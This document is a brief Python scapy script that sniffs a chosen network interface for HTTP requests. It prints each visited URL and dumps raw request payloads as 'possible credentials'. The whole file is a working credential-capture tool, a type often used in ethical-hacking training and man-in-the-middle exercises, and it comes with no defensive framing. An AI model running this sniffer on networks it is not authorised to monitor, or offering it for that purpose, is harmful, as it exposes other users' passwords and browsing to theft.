#!/usr/bin/env python
import scapy.all as scapy
import optparse
from scapy.layers import http

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help=" enter interface to sniff data on ")
    (options, arguments) = parser.parse_args()
    return options.interface
# capture data on provided interface , dont store data on system , prn : callback function - forward data to specified function
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

# capture and process the data sent by sniff fucntion
def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):             # consider only those packets transferred over HTTP
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path   # store path and host of url in a var
        print(f"\n  Url => {url.decode(errors='ignore')}")
        if packet.haslayer(scapy.Raw):             # consider only that part of packet transferred in raw form , usually credentials
            load = packet[scapy.Raw].load.decode(errors='ignore')    # decode and store in var
            print(f"\n [+] Possible credentials : {load}")

def main():
    options = get_arguments()
    sniff(options)

if __name__ == "__main__":
    main()

